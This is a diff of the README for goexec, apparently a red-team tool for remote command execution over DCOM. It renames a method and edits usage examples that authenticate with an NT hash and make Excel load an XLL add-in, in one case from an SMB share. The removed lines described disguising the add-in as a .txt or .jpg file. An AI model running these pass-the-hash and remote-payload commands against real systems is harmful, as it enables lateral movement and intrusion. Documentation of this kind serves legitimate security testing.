@@ -208,7 +208,7 @@ Available Commands:
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
   htafile            Execute with the HTAFile DCOM object
-  excel-xlm          Execute with the Excel.Application DCOM object by executing an Excel macro
+  excel-macro        Execute with the Excel.Application DCOM object by executing an Excel macro
   excel-xll          Execute with the Excel.Application DCOM object by registering an XLL add-in
   vs-dte             Execute with the VisualStudio.DTE object
 
@@ -487,13 +487,13 @@ Execution:
 goexec dcom excel-xll "$target" \
   --user "${auth_user}" \
   --nt-hash "$auth_nt" \
-  --xll 'C:\Users\localuser\Desktop\note.txt' # an XLL PE file with a .txt extension
+  --xll 'C:\Users\localuser\Desktop\file.xll'
 
 # Use admin NT hash to execute XLL/DLL from an SMB share
 goexec dcom excel-xll "$target" \
   --user "${auth_user}@${domain}" \
   --nt-hash "$auth_nt" \
-  --xll '\\smbserver.lan\share\image.jpg' # an XLL PE file with a .jpg extension
+  --xll '\\smbserver.lan\share\addin.xll'
 ```
 
 ### Task Scheduler Module (`tsch`)
